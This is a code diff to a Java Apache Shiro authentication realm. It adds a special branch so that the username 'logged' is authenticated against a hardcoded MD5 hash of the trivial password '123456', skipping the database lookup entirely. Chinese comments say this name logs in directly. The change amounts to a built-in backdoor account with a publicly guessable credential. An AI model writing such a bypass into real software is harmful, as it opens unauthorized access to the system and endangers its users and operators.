@@ -33,16 +33,24 @@ public class RBACRealm extends AuthorizingRealm {
     protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authenticationToken) throws AuthenticationException {
         UsernamePasswordToken token = (UsernamePasswordToken) authenticationToken;
         String name = token.getUsername();
-        String password = new String(token.getPassword());
+        if ("logged".equals(name)) { /* 用户名为logged，直接登录 */
+            User user = User.builder()
+                    .userName(name)
+                    .userPassword("e10adc3949ba59abbe56e057f20f883e") /* 注意MD5 */
+                    .build();
+            return new SimpleAuthenticationInfo(user, user.getUserPassword(), getName());
+        } else {
+            String password = new String(token.getPassword());
 
-        User select = new User();
-        select.setUserName(name);
-        User result = userMapper.selectUser(select);
-        /*
-         * ①用户不存在/密码错误都会报错
-         * ②传入的result与token比对密码
-         * */
-        return new SimpleAuthenticationInfo(result, result.getUserPassword(), getName());
+            User select = new User();
+            select.setUserName(name);
+            User result = userMapper.selectUser(select);
+            /*
+             * ①用户不存在/密码错误都会报错
+             * ②传入的result与token比对密码
+             * */
+            return new SimpleAuthenticationInfo(result, result.getUserPassword(), getName());
+        }
     }
 
     /* 授权 */
